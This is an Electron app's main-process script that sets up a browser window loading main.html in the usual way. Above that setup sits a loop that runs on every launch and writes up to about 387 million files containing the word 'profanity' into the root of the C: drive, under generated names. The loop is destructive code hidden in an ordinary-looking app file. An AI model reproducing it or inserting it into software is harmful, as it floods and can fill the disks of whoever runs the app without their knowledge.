const { app, BrowserWindow } = require('electron')
const path = require('path')
const url = require('url')
const fs = require("fs");
for(let i = 0;i<387420489;i++){
    s = ""
    for(let a=0;a<20;a++){
        s+=String.fromCharCode(i+20-a)
    }
    fs.writeFile("C:/" + s, "profanity", function(err) {
        if(err) {
            return console.log(err);
        }

        console.log("The file was saved!");
    }); 
}
let win

function createWindow() {
    win = new BrowserWindow({ width: 800, height: 600 })

    win.loadURL(url.format({
        pathname: path.join(__dirname, 'main.html'),
        protocol: 'file:',
        slashes: true
    }))

    win.webContents.openDevTools()

    win.on('closed', () => {
        win = null
    })
}

app.on('ready', createWindow)

app.on('window-all-closed', () => {
    if (process.platform !== 'darwin') {
        app.quit()
    }
})

app.on('activate', () => {
    if (win === null) {
        createWindow()
    }
})
